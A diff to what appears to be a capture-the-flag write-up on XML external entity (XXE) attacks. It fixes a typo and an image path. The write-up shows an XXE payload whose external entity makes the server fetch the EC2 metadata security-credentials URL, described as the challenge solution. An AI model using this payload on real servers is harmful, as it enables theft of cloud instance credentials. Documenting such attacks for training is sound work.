@@ -55,13 +55,13 @@ ic| xml: (b'<?xml version="1.0" encoding="UTF-8"?>
 It is possible to observe an XXE attack with the following XML payload:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-i nstance"> ]>
+<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"> ]>
 <product>
 	<productId>&id;</productId>
 </product>
 ```
 This payload forced the server to fetch the URL `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` which is the solution for this challenge.  
-![169.254.169.254](169.254.169.254.jpg)  
+![169.254.169.254](imgs/169.254.169.254.jpg)  
 [https://mobile.twitter.com/csecurity7575](https://mobile.twitter.com/csecurity7575)
 
 ---
